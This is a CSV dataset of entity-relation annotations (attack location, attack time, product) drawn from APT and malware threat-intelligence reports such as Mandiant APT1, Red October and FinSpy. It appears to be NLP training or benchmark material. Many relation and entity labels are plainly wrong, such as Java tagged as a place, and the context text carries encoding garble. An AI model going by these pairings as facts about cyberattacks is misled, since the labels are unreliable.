"FileName","RelationType","Entity1Mention","Entity1Type","Entity2Mention","Entity2Type","Context"
"15-2013-youonlyclicktwice","hasattacktime","Ethiopian","NORP","September of last year","DATE","The Ethiopian sample is the second FinSpy sample we have discovered that communicates with a server we identified by scanning as a FinSpy command & control server . This further validates our scanning results , and calls into question Gamma¡¯s claim that such servers are ¡ ° not ÿ from the FinFisher product line.¡±10 Similarities between the Ethiopian sample and those used to target Bahraini activists also bring into question Gamma International¡¯s earlier claims that the Bahrain samples were stolen demonstration copies . While the sale of such intrusion and surveillance software is largely unregulated , the issue has drawn increased high - level scrutiny . In September of last year , the German foreign minister , Guido Westerwelle , called for an EU - wide ban on the export of such surveillance software to totalitarian states.11 In a December 2012 interview , Marietje Schaake ( MEP ) , currently the rapporteur for the first EU strategy on digital freedom in foreign policy , stated that it was ¡ ° quite shocking¡± that Europe companies continue to export repressive technologies to countries where the rule of law is in question.12 "
"securelist.com-Red October Detailed Malware Description 4 Second Stage of Attack","hasproduct","Microsoft","ORG","Visual Studio 2010","PRODUCT","The file is a PE DLL file without two exported functions ( ServiceMainand WinMessage ) , compiled with Microsoft Visual Studio 2010 . "
"1401223631603288","hasattacklocation","APT","ORG","Korea","GPE","In the APT attacks against the companies in Korea , the ETSO Attack Group used encrypted communication between the master which generated the malware , monitored the system and managed the C2 agent , and the agent which accessed the C2 server . "
"Mandiant_APT1_Report","hasattacklocation","APT","ORG","China","GPE","We refer to this group as ¡ ° APT1¡± and it is one of more than 20 APT groups with origins in China . "
"2013-9","hasattacktime","50.6 million dollars","MONEY","2013, March, 3","DATE","They were also required to pay 50.6 million dollars in fines for failing to fix the safety violations that were brought 82 Recasting the Red Star 83 https://ics-cert.us-cert.gov/pdf/ICSA-11-096-01.pdf 84 Centers for Disease Control . ( 2013 , March , 3 ) . "
"2013-9","hasattacklocation","Putin","PERSON","Russia","GPE","A former KGB member , Putin has sought the consolidation and reclaim of critical sectors of the Russian economy , most notably the energy sector . Using strong - arm tactics and political pressure , he has set the tone for Russia¡¯s future policy . In 2006 , Russia temporarily turned off the gas it was supplying to the Ukraine , inciting conflict and unrest with other European countries . "
"hidden_lynx","hasproduct","Hidden Lynx","ORG","Backdoor.Moudoor","PRODUCT","In 2011 , the Hidden Lynx group began to use Backdoor . Moudoor . "
"2013-9","hasattacklocation","¡¯","ORG","the United States","GPE","The virus was triggered on a Muslim holiday when most of the company¡¯s employees were absent from work . Shamoon was designed to replace data on hard drives with a picture of a burning American flag and report the ad.dress of the computer back to a separate computer inside the company network.44 This is potentially significant because Aramco is the world¡¯s largest producer of oil , and was originally a joint effort with the United States ( Arabian American Oil Company).45,46 "
"icefog","hasattacklocation","¡°Icefog¡±","ORG","South Korea","GPE","This paper describes ¡ ° Icefog¡± , a small APT group which focuses on targets in South Korea and Japan . "
"C5_APT_C2InTheFifthDomain","hasattacktime","Lelli","PERSON","March 12","DATE","A Lelli , A. ( 2010 , March 12 ) . "
"2013-9","hasattacktime","billions of dollars","MONEY","2011","DATE","The article notes that ¡ ° when Venezuela seized billions of dollars in assets from Exxon Mo. 22 U.S. Energy Information Administration . ( 2013 , February 12 ) . International Energy Statistics [ Data file ] . Retrieved from http://www.eia.gov/cfapps/ipdbproject/iedindex3.cfm?tid=5&pid=53&aid=1&cid=CH,&syid=2006&eyid=2012&unit=TBPD 23 Kirk , J. ( 2011 , February 10 ) . "
"fireeye-poison-ivy-report","hasproduct","Calamine","ORG","ChopShop","PRODUCT","But if PIVY network activity is collected , the Calamine ChopShop module can help uncover this information . "
"securelist.com-Red October Detailed Malware Description 5 Second Stage of Attack","hasproduct","CONAGetDevice","ORG","API","PRODUCT","The module uses CONARefreshDeviceList , CONASetDeviceListOption , CONAGetDeviceCount , CONAGetDevices and CONAGetDevice API functions to obtain a device which will be manipulated . "
"NS-Unveiling-an-Indian-Cyberattack-Infrastructure_FINAL_Web","hasproduct","Telenor","ORG","Visual Basic","PRODUCT","On this site there¡¯s what appears to be an installer for the Bitdefender antivirus product ( bitdefender_tsecurity.zip , md5 62b702a15a762692eda296b0aea270f9 ) , but the zip file contains both a real installer and a Visual Basic trojan identical to the one used against Telenor . "
"wp-fakem-rat","indicates","Messenger","PRODUCT","two","CARDINAL","Messenger traffic shown in Figure 5 , it is easy to distinguish between the two . "
"19-2013-acalltoharm","indicates","Arabic","LANGUAGE","English","LANGUAGE","ShadowTech Rat is a Remote Access Trojan which appears to be widely available for download on both English and Arabic language sites . "
"C5_APT_C2InTheFifthDomain","hasattacklocation","Fagerland","ORG","China","GPE","( Fagerland , 2011 ) The date of effect of the revocation has sincebeen backdatedtopreventthismalware¡¯scertificate 14 fromvalidating . Thenewdateofeffectstillmay notprevent the validation of all malware using this compromisedcodesigning certificate . 12 Hupigon is a remote administration tool from China . "
"fireeye-poison-ivy-report","hasproduct","PyCommands","ORG","PIVY","PRODUCT","The FireEye PIVY module for ChopShop decrypts Poison Ivy network traffic . PyCommands , meanwhile , are Python scripts that automate tasks for Immunity Debugger , a popular tool for reverse - engineering malware binaries.2 The FireEye PyCommand script dumps configuration information from a running PIVY process on an infected endpoint , which can provide additional telemetry about the threat actor behind the attack . "
"securelist.com-Red October Detailed Malware Description 3 Second Stage of Attack","hasproduct","CreatWindowEx","ORG","API","PRODUCT","Creates window with CreatWindowEx API using ClassName ¡ ° svchost.exe ¡ ° , window name ¡ ° svchost¡± and associates it with a registered class . "
"2013-9","indicates","Quantum Leap","WORK_OF_ART","The Dragon¡¯","WORK_OF_ART","Timothy Thomas discusses this in his books Recasting the Red Star and The Dragon¡¯s Quantum Leap . "
"stuxnet_0_5_the_missing_link","hasattacktime","eight","CARDINAL","approximately 30 days","DATE","Example valve configuration showing both valve types in three stages of a cascade Similar to version 1.x of Stuxnet , the PLC device attack code consists of a state machine with eight possible states : State 0 ( Wait ): Perform system identification and wait for the enrichment process to reach steady state before attack . This can take approximately 30 days . "
"securelist.com-Red October Detailed Malware Description 3 Second Stage of Attack","hasproduct","Microsoft","ORG","Windows MAPI","PRODUCT","This is done in case Microsoft Windows MAPI framework creates a popup message with some connection error report , or asks the user to enter credentials from the mailbox . "
"w64_regin_stage_1","hasproduct","Dynamic Link Library","ORG","Windows","PRODUCT","An examination of the static properties of the file reveals that the file is a 64 - bit Dynamic Link Library for the Microsoft Windows operating system . "
"Inside_Report_by_Infosec_Consortium","hasattacklocation","APT","ORG","India","GPE","The next part of this research paper focuses on a recent APT campaign against multiple countries including India was targeted . "
"FireEye-Terminator_RAT","hasattacklocation","Aumlib","ORG","Taiwan","GPE","Earlier , we documented changes to Aumlib , the malware used in the attack against the New York Times , and Taidoor , a malware family that is being used in ongoing cyber - espionage campaigns particularly against entities in Taiwan . "
"hidden_lynx","hasattacklocation","Hidden Lynx","ORG","China","GPE","Trojans used by the Hidden Lynx group The following section lists the Trojans that were used by the Hidden Lynx group throughout their various campaigns . Backdoor . Moudoor In 2011 , the Hidden Lynx group began to use Backdoor . Moudoor . This is a customized version of ¡ ° Gh0st RAT¡±. Gh0st RAT variants have been used in cyberespionage campaigns emanating from China for years . "
"2013-9","hasattacklocation","xxgc","ORG","Vietnam","GPE","In the process of their investigation , they tied back the account to an operator going by the screen name ¡ ° xxgchappy.¡± They also found a piece of malware ostensibly written by xxgc happy appearing to date back to March of 2002 . This is potentially significant because it is the time frame around which the leaked US embassy cable had noted possible PLA cyber espionage activity . Malware used by this actor , as well as appearing in Mirage and Gh0stNet , was discovered in 2011 and 2012 to have infected government ministries in Vietnam , Brunei , and Myanmar . "
"securelist.com-Red October Detailed Malware Description 1 First Stage of Attack","hasproduct","Microsoft","ORG","Visual Studio 2005","PRODUCT","The file is a PE DLL file , no export symbols , compiled with Microsoft Visual Studio 2005 . "
"securelist.com-Red October Detailed Malware Description 1 First Stage of Attack","hasproduct","Visual Basic 6.0 Runtime","ORG","Visual FoxPro 8.0","PRODUCT","The ( 1 ) ListView , ( 2 ) ListView2 , ( 3 ) TreeView , and ( 4 ) TreeView2 ActiveX controls in MSCOMCTL.OCX in the Common Controls in Microsoft Office 2003 SP3 , 2007 SP2 and SP3 , and 2010 Gold and SP1 ; Office 2003 Web Components SP3 ; SQL Server 2000 SP4 , 2005 SP4 , and 2008 SP2 , SP3 , and R2 ; BizTalk Server 2002 SP1 ; Commerce Server 2002 SP4 , 2007 SP2 , and 2009 Gold and R2 ; Visual FoxPro 8.0 SP1 and 9.0 SP2 ; and Visual Basic 6.0 Runtime allow remote attackers to execute arbitrary code via a crafted ( a ) web site , ( b ) Office document , or ( c ) .rtf file that triggers ¡ ° system state¡± corruption , as exploited in the wild in April 2012 , aka ¡ ° MSCOMCTL.OCX RCE Vulnerability.¡±¡± "
"India_Pak_Tranchulas","hasattacklocation","Tranchulas","ORG","the United Kingdom","GPE","The significance of the username Tranchulas within the debug path of the winsocks.exe binary is that Tranchulas is a Pakistani information security consulting company with offices in the United Kingdom , United States , and Pakistan . "
"fireeye-operation-ke3chang","hasattacklocation","CnC","ORG","U.S.","GPE","All of the CnC communications are performed over the HTTP protocol . The current Ke3chang campaign leverages the BS2005 malware , while older activity from 2010 - 2011 leveraged BMW , followed by the MyWeb malware sporadically used in between . BS2005 : Oct 2011 . present ( most recent ) BS2005 campaign : ¡ ° moviestar¡± Just as the media began to report on possible U.S. military intervention in Syria , the Ke3chang attackers began to use this topic as a lure to trick their targets into running their malware . "
"2013-9","hasattacklocation","Chinese","NORP","China","GPE","This could allow for the Chinese to weaken American influence in the region and create agitation against the US or between other countries within the region in order to distract the US from its goals in other areas stra.tegic to the Chinese . These deals also place China in the supply chain for borrowers¡¯ projects where China has insisted on Chinese companies being involved as a stipulation of the loan . "
"icefog","hasproduct","Icefog","ORG","Windows","PRODUCT","The HLP files do not contain exploits but they are abusing certain Windows ¡ ° features¡± to drop the malware . It¡¯s interesting to know that Icefog is not the only crew to heavily use HLP ¡ ° exploits¡± as a part of their toolkit . "
"15-2013-youonlyclicktwice","hasattacklocation","FinSpy","ORG","Bahrain","GPE","In an August 2012 response to a letter from UK - based NGO Privacy International , the UK Government revealed that at some unspecified time in the past , it had examined a version of FinSpy , and communicated to Gamma that a license would be required to export that version outside of the EU . Gamma has repeatedly denied links to spyware and servers uncovered by our research , claiming that the servers detected by our scans are ¡ ° not ÿ from the FinFisher product line.¡±4 Gamma also claims that the spyware sent to activists in Bahrain was an ¡ ° old¡± demonstration version of FinSpy , stolen during a product presentation . "
"Operation_DeputyDog","hasattacklocation","FireEye","ORG","Hong Kong","GPE","Furthermore , FireEye has discovered that the group responsible for this new operation is the same threat actor that compromised Bit9 in February 2013 . FireEye detected the payload used in these attacks on August 23 , 2013 in Japan . The payload was hosted on a server in Hong Kong ( 210.176.3.130 ) and was named ¡ ° img20130823.jpg¡±. "
"Mandiant_APT1_Report","hasattacktime","Word 2007","WORK_OF_ART","February 6, 2013.  17","DATE","An information hiding method of Word 2007 based on image covering,¡± Journal of Sichuan University ( Natural Science Edition ) 47 ( 2010 ) , http://www.paper.edu.cn/journal/downCount/0490-6756(2010)S1-0031-06 , accessed February 6 , 2013 . 16 Hebei Chamber of Commerce , Bio of member Wang Weizhong ( 2012 ) , http://www.hbsh.org/shej_ejsheqmsg . aspx?mid=26&uid=06010000&aid=06 , accessed February 6 , 2013 . 17 Zeng Fan - jing , Yu Yun - xiang , and Chang Li , "
"Securelist_RedOctober_Detail","indicates","Excel","PRODUCT","two","CARDINAL","These attacks comprised of the classical scenario of specific targeted attacks , consisting of two major stages : 1 . Initial infection 2 . Additional modules deployed for intelligence gathering The malicious code was delivered via e - mail as attachments ( Microsoft Excel , Word and , probably PDF documents ) which were rigged with exploit code for known security vulnerabilities in the mentioned applications . "
"hidden_lynx","hasattacktime","FINSHO","PERSON","February 25","DATE","FINSHO Within two days of Bit9¡¯s blog post on February 25 , the attackers began distributing Moudoor and Naid in a campaign that leveraged CVE-2013 - 1493 . "
"FTA 1008 - Darkseoul-Jokra Analysis and Recovery","hasproduct","Fidelis XPS","ORG","DarkSeoul","PRODUCT","The Fidelis Take Fidelis XPS sensors detect the DarkSeoul / Jokra malware as it enters the network as""Trojan . Win32.EraseMBR.b "" . Fidelis XPS is capable of detecting this threat regardless of deliverymethod employed by the Threat Actors responsible . "
"India_Pak_Tranchulas","hasattacklocation","TCIRT","ORG","Pakistan","GPE","The TCIRT believes that a possible theory that supports an Indian attack scenario is that the Telenor subsidiary , Telenor Pakistan , is a strategic communications infrastructure provider . Telenor Pakistan provides voice , data content and mobile communications to more than 3,500 cities and towns within Pakistan . "
"15-2013-youonlyclicktwice","hasattacklocation","iOS","ORG","Bahrain","GPE","The FinFisher suite includes mobile phone versions of FinSpy for all major platforms including iOS , Android , Windows Mobile , Symbian and Blackberry . Its features are broadly similar to the PC version of FinSpy identified in Bahrain , but it also contains mobile - specific features such as GPS tracking and functionality for silent ¡ ® spy¡¯ calls to snoop on conversations near the phone . "
"Secrets_of_the_Comfoo_Masters","hasproduct","Comfoo","ORG","C2","PRODUCT","The Comfoo C2 server turns out to be a rendezvous - type traffic relay program . "
"Mandiant_APT1_Report","hasattacktime","Alien Vault","WORK_OF_ART","February 3, 2013.  34","DATE","33 Jaime Blasco , ¡ ° Unveiling a spearphishing campaign and possible ramifications,¡± Alien Vault ( 2012 ) , http://labs.alienvault.com/labs/index . php/2012 / unveiling - a - spearphishing - campaign - and - possible - ramifications/ , accessed February 3 , 2013 . 34 Chloe Whiteaker , ¡ ° Following the Hackers¡¯ Trail,¡± Bloomberg , ( 2012 ) http://go.bloomberg.com/multimedia/following-hackers-trail/ , accessed February 3 , 2013 . "
"15-2013-youonlyclicktwice","hasattacklocation","FinSpy","ORG","Bahrain","GPE","The Ethiopian sample is the second FinSpy sample we have discovered that communicates with a server we identified by scanning as a FinSpy command & control server . This further validates our scanning results , and calls into question Gamma¡¯s claim that such servers are ¡ ° not ÿ from the FinFisher product line.¡±10 Similarities between the Ethiopian sample and those used to target Bahraini activists also bring into question Gamma International¡¯s earlier claims that the Bahrain samples were stolen demonstration copies . "
"hidden_lynx","hasattacklocation","WSDHEALTHY","ORG","Hong Kong","GPE","This is , without a doubt , the longest running distribution vector for the group , which infected victims predominantly in China , the United States and Hong Kong . These are the earliest indications of Moudoor infections , with ¡ ° kissnada¡± being one of the first DTDNS domains observed in use . This distribution vector¡¯s exact purpose is still unclear , however it¡¯s certainly linked to the group , as we have observed Moudoor samples in WSDHEALTHY configured to use kissnada58.chatnook.com and usa-mail.scieron.com for C&C communications . "
"Presentation_Targeted-Attacks_EN","hasattacklocation","Windows","ORG","Hungary","GPE","computers by masquerading as a proxy for Windows update .uses a fake certificate that looks like a valid Microsoft certificate .needed advanced collision attack on the MD5 hash function .thousands of victims , mostly in Iran , Israel ( Palestine territories ) , and Sudan , but also in Hungary ! "
"rpt-operation-saffron-rose","hasproduct","Ajax Security Team","ORG","CnC","PRODUCT","While the Ajax Security Team¡¯s capabilities remain unclear , we know that their current operations have been somewhat successful as measured by the number of victims seen checking into to an Ajax Security Team controlled CnC server . "
"India_Pak_Tranchulas","indicates","Visual C","PRODUCT","Microsoft","ORG","It is highly likely that the malware and decoy document would be tailored for and delivered to specific recipients associated with the GoI or MoD. The SFX dropper contained multiple custom executable files , as well as legitimate Microsoft Visual C++ Runtime Library files , which are part of the codebaseused to develop and required to execute the backdoor code . "
"fireeye-malware-supply-chain","hasattacktime","four","CARDINAL","January 2, 2013","DATE","We identified four different samples linked to the Piping campaign . These samples were detected as Trojan . APT.PoisonIvy and Trojan . APT.9002 . The Piping linked samples had compile timestamps between December 19 , 2012 and January 2 , 2013 . "
"hidden_lynx","hasattacklocation","Hidden Lynx","ORG","China","GPE","Much of the attack infrastructure and tools used during these campaigns originate from network infrastructure in China . The Hidden Lynx group makes regular use of zero - day exploits and has the ability to rework and customize exploits quickly . They are methodical in their approach and they display a skillset far in advance of some other attack groups also operating in that region , such as the Comment Crew ( also known as APT1 ) . The Hidden Lynx group is an advanced persistent threat that has been in operation for at least four years and is breaking into some of the best - protected organizations in the world . "
"fireeye-poison-ivy-report","hasattacklocation","Nitro","ORG","Java","GPE","Still active a year later , the Nitro attackers used a zero - day vulnerability in Java to deploy PIVY in 2012.12 Just recently , PIVY was the payload of a zero - day exploit in Internet Explorer used in what is known as a ¡ ° strategic web compromise¡± attack against visitors to a U.S. government website and a variety of others.13 RATs require live , direct , real - time human interaction by the APT attacker . "
"RAP002_APT1_Technical_backstage.1.0","indicates","2AM","TIME","Poison Ivy  3.1 Description  Poison Ivy","WORK_OF_ART","Generally , the attackers worked between 2AM and 10AM from Monday to Saturday included . 3 Poison Ivy 3.1 Description Poison Ivy is a Remote Administration Tool ( RAT ) available here : http://www.poisonivy-rat.com/index.php?link=download . "
"hidden_lynx","hasproduct","Hidden Lynx","ORG","Trojans","PRODUCT","Trojans used by the Hidden Lynx group The following section lists the Trojans that were used by the Hidden Lynx group throughout their various campaigns . "
"Mandiant_APT1_Report","involvesmalware","¡°DOTA¡±","ORG","dozens","CARDINAL","The second persona , an actor we call ¡ ° DOTA¡± , has registered dozens of email accounts used to conduct social engineering and spear phishing attacks in support of APT1 campaigns . "
"15-2013-youonlyclicktwice","hasattacktime","FinSpy","ORG","September of last year","DATE","The Ethiopian sample is the second FinSpy sample we have discovered that communicates with a server we identified by scanning as a FinSpy command & control server . This further validates our scanning results , and calls into question Gamma¡¯s claim that such servers are ¡ ° not ÿ from the FinFisher product line.¡±10 Similarities between the Ethiopian sample and those used to target Bahraini activists also bring into question Gamma International¡¯s earlier claims that the Bahrain samples were stolen demonstration copies . While the sale of such intrusion and surveillance software is largely unregulated , the issue has drawn increased high - level scrutiny . In September of last year , the German foreign minister , Guido Westerwelle , called for an EU - wide ban on the export of such surveillance software to totalitarian states.11 In a December 2012 interview , Marietje Schaake ( MEP ) , currently the rapporteur for the first EU strategy on digital freedom in foreign policy , stated that it was ¡ ° quite shocking¡± that Europe companies continue to export repressive technologies to countries where the rule of law is in question.12 "
"fireeye-malware-supply-chain","targets","Sunshop","PERSON","Trojan","PRODUCT","We have detailed the specifics of the Sunshop campaign on the FireEye blog.6 We found 15 different samples linked to the Sunshop campaign . These samples were detected as Trojan . "
"15-2013-youonlyclicktwice","targets","FinSpy","ORG","FinSpy","PRODUCT","A FinSpy campaign in Ethiopia uses pictures of Ginbot 7 , an Ethiopian opposition group , as bait to infect users . This continues the theme of FinSpy deployments with strong indications of politically - motivated targeting . "
"fireeye-operation-ke3chang","hasproduct","Ke3chang","ORG","Java","PRODUCT","Percent of attacks by industry targeted by Ke3chang actor 4 Ke3chang used the Java vulnerability ( CVE-2012 - 4681 ) before a patch was available . "
"15-2013-youonlyclicktwice","hasattacklocation","FinSpy","ORG","Mongolia","GPE","Taken together , FinSpy servers are currently , or have been present , in 25 countries . Australia , Bahrain , Bangladesh , Brunei , Canada , Czech Republic , Estonia , Ethiopia , Germany , India , Indonesia , Japan , Latvia , Malaysia , Mexico , Mongolia , Netherlands , Qatar , Serbia , Singapore , Turkmenistan , United Arab Emirates , United Kingdom , United States , Vietnam . "
"winnti-more-than-just-a-game-130410","indicates","C2","PRODUCT","eight","CARDINAL","Different C2 servers could push different plugins . In total we have discovered eight functional libraries : Plugin Name Plugin Purpose "
"fireeye-poison-ivy-report","hasproduct","ChopShop1","ORG","ChopShop","PRODUCT","PIVY callback - decoding tool ( ChopShop module ) . IVY memory - decoding tool ( Immunity Debugger PyCommand script ) ChopShop1 is a new framework developed by the MITRE Corporation for network - based protocol decoders that enable security professionals to understand actual commands issued by human operators controlling endpoints . "
"2013-9","hasattacklocation","Macondo","ORG","Russia","GPE","In March of 2009 , drilling of a new well , Macondo , was approved and scheduled to begin later that year , creating 81 Ibid . , p.87.an ideal target . Realistically , in a clandestine project of such importance it is likely that Russia would have identified sev.eral GoM targets , perhaps alongside BP North Sea assets as well . "
"19-2013-acalltoharm","hascharacteristics","Green Simurgh","WORK_OF_ART","two","CARDINAL","As demonstrated by our work on the Freegate malware , as well as the Green Simurgh case , these vulnerabilities are exploited with serious consequences for high - risk users . We understand the resource constraints that developers of free security and circumvention software often face . As such , we propose two simple steps that Freegate could take to help mitigate the current and similar future threats . . "
"Mandiant_APT1_Report","hasattacklocation","DOTA","ORG","China","GPE","In an observed session on a compromised machine , DOTA used the phone number ¡ ° 159 - 2193 - 7229¡± to receive a verification text message from Google , which he then submitted to their page within seconds . Telephone numbers in China are organized into a hierarchy containing an area code , prefix , and line number similar to phone numbers in the United States , with the addition that a few area codes are allocated for use by mobile phone providers . "
"1401223631603288","hasattacklocation","ETSO","ORG","South Korea","GPE","The C&Cs ( Command & Control ) attacked by ETSO were mainly located in South Korea , Hong Kong , China and the US , reaching a peak of 64.30 % of all attack locations . The C&C servers which were used to attack Korean game companies came primarily through IPs from South Korea and Taiwan . "
"Kimsuky","hasattacklocation","Hancom Office","ORG","South Korea","GPE","The HWP file format is similar to Microsoft Word documents , but supported by Hangul , a South Korean word processing application from the Hancom Office bundle . Hancom Office is widely used in South Korea . "
"NS-Unveiling-an-Indian-Cyberattack-Infrastructure_FINAL_Web","hasattacklocation","Khalistancalling.com","ORG","India","GPE","Khalistancalling.com has since moved on to another bad IP ( 46.182.104.83 ) and must be considered owned by the attackers . The Nagaland movement The Nagaland ( or Nagalim ) movement is another secessionist group aiming to create a sovereign homeland for the Naga people living in North - Eastern India and North - Western Burma . "
"19-2013-acalltoharm","hasattacktime","Assad","PERSON","the second week of June","DATE","The other is an e - mail attachment calling for jihad against Hezbollah and the Assad regime or promising interesting regional news . ATTACK 1 : A HELPING OF MALWARE WITH THAT PROXY ? In this attack , which we first observed in the second week of June , the potential victim is encouraged to visit a download link containing a malicious installer of Freegate . Freegate is a standalone circumvention - bypassing Virtual Private Network ( VPN ) client for Windows . "
"2013-9","hasattacklocation","billions of dollars","MONEY","China","GPE","They could save billions of dollars and shave years of research off by acquiring technology from petrochemical corporations that are already heavily invested in this continuing process . It also means that China would be able to compete in the global market place much sooner and more competitively than if they waited to develop the technology on their own . "
"India_Pak_Tranchulas","hasattacklocation","ThreatConnect.com","ORG","Pakistan","GPE","If you or your organization is interested in obtaining crowd - sourced threat intelligence that increases your awareness of emerging cyber threats , pleaseregister at ThreatConnect.com and join our community . Tags : Cyber Espionage , India , Pakistan , South Asia , Telenor "
"Mandiant_APT1_Report","hasattacktime","Alien Vault","WORK_OF_ART","February 3, 2013","DATE","33 Jaime Blasco , ¡ ° Unveiling a spearphishing campaign and possible ramifications,¡± Alien Vault ( 2012 ) , http://labs.alienvault.com/labs/index . php/2012 / unveiling - a - spearphishing - campaign - and - possible - ramifications/ , accessed February 3 , 2013 . 34 Chloe Whiteaker , ¡ ° Following the Hackers¡¯ Trail,¡± Bloomberg , ( 2012 ) http://go.bloomberg.com/multimedia/following-hackers-trail/ , accessed February 3 , 2013 . "
"hidden_lynx","hasproduct","Bit9","ORG","SQL","PRODUCT","A well - known group with affiliations to ¡ ° Operation Aurora¡± managed to break into Bit9¡¯s network using an SQL injection attack . "
"securelist.com-Red October Detailed Malware Description 5 Second Stage of Attack","hasproduct","Microsoft","ORG","Visual C","PRODUCT","Updater component File name : Update.exe PE Exe file compiled with Microsoft Visual C++ 2005 . "
"2013-9","hasattacklocation","BP","ORG","Russia","GPE","This could be achieved by play.ing on known patterns and behaviors by BP that were risky . The type of intelligence Russia would have been intimately familiar with through their own dealings with BP and analysis of other BP safety incident in the recent past . "
"fireeye-malware-supply-chain","targets","Sunshop","PERSON","Trojan","PRODUCT","We have detailed the specifics of the Sunshop campaign on the FireEye blog.6 We found 15 different samples linked to the Sunshop campaign . These samples were detected as Trojan . APT.Gh0st , Trojan . "
"15-2013-youonlyclicktwice","hasattacklocation","FinSpy","ORG","Indonesia","GPE","Taken together , FinSpy servers are currently , or have been present , in 25 countries . Australia , Bahrain , Bangladesh , Brunei , Canada , Czech Republic , Estonia , Ethiopia , Germany , India , Indonesia , Japan , Latvia , Malaysia , Mexico , Mongolia , Netherlands , Qatar , Serbia , Singapore , Turkmenistan , United Arab Emirates , United Kingdom , United States , Vietnam . "
"MiniDuke_Paper_Final","indicates","PDF","PRODUCT","three","CARDINAL","This piece of malware is made of three components : pdf , main , payload . The PDF file embeds exploit code and a dropper that writes the ¡ ° main¡± DLL component on the drive . "
"Inside_Report_by_Infosec_Consortium","hasattacklocation","Hunter","PERSON","India","GPE","Hunter or the Hunted ? . Part two . Advanced persistent threat - analysis . Part three - Primary Causes . Part four - Recommendations APT campaigns against India ¡ ° Advanced persistent threat¡± or APT as it is known , is a reality today . "
"2013-9","hasattacklocation","Cyber Espionage","ORG","China","GPE","Spear Phishing Countries with Companies Affected : Undisclosed Campaign : Byzantine Candor Publisher : Bloomberg Synopsis : An expos¨ ¦ run by Bloomberg in 2012 chronicled the undertakings of a security research coalition which decided to track one of the largest Cyber Espionage groups operating out of China . "
"15-2013-youonlyclicktwice","hasattacklocation","FinFisher","ORG","Bahrain","GPE","Civil society groups have found cause for concern in these findings , as they indicate the use of FinFisher products by countries like Turkmenistan and Bahrain with problematic records on human rights , transparency , and rule of law . "
"Syrian_Malware_Team_BlackWorm","hasattacklocation","SEA","ORG","Kuwait","GPE","This indicates that the Syrian Malware Team may also be possibly an offshoot or part of the SEA . Banner used by the Syrian Malware Team BlackWorm Authorship We found at least two distinct versions of the BlackWorm tool , including an original / private version ( v0.3.0 ) and the Dark Edition ( v2.1 ) . The original BlackWorm builder was co - authored by Naser Al Mutairi from Kuwait , better known by his online moniker ‘ njq8 ' . "
"Mandiant_APT1_Report","hasattacktime","Alien Vault","WORK_OF_ART","2012","DATE","33 Jaime Blasco , ¡ ° Unveiling a spearphishing campaign and possible ramifications,¡± Alien Vault ( 2012 ) , http://labs.alienvault.com/labs/index . "
"Mandiant_APT1_Report","hasattacklocation","Google","ORG","China","GPE","In an observed session on a compromised machine , DOTA used the phone number ¡ ° 159 - 2193 - 7229¡± to receive a verification text message from Google , which he then submitted to their page within seconds . Telephone numbers in China are organized into a hierarchy containing an area code , prefix , and line number similar to phone numbers in the United States , with the addition that a few area codes are allocated for use by mobile phone providers . "
"Mandiant_APT1_Report","hasattacklocation","DOTA","ORG","Philippines","GPE","We have also observed DOTA using the names Rodney and Raith to communicate via email in fluent English Dota : a harry ¡ ° Poter¡± fan ? with various targets including South East Asian military The DOTA persona also appears to be a organizations in Malaysia and the Philippines . "
"hidden_lynx","hasattacklocation","WSDHEALTHY","ORG","the United States","GPE","This is , without a doubt , the longest running distribution vector for the group , which infected victims predominantly in China , the United States and Hong Kong . These are the earliest indications of Moudoor infections , with ¡ ° kissnada¡± being one of the first DTDNS domains observed in use . This distribution vector¡¯s exact purpose is still unclear , however it¡¯s certainly linked to the group , as we have observed Moudoor samples in WSDHEALTHY configured to use kissnada58.chatnook.com and usa-mail.scieron.com for C&C communications . "
"2013-9","hasattacktime","American","NORP","2012, Oct. 23","DATE","If Iran did in fact orches.trate the Shamoon attack , it would suggest that the series of attacks on Iranian critical infrastructure were followed by retaliation on the American oil supply chain . This would indicate an ongoing and escalating conflict that should be cause for concern . 51 Ibid 52 Rezvaniyeh , F. , ( 2010 , Feb. 26 ) Pulling the strings of the net : Iran¡¯s Cyber Army . PBS . Retrieved from http://www.pbs.org/wgbh/pages/frontline/tehranbureau/2010/02/pulling-the-strings-of-the-net-irans-cyber-army.html 53 Perlroth , N. , ( 2012 , Oct. 23 ) . "
"2013-9","indicates","APT1","ORG","Night Dragon","WORK_OF_ART","As mentioned , both the Night Dragon and APT1 attacks stole an enor.mous amount of data from English speaking companies . "
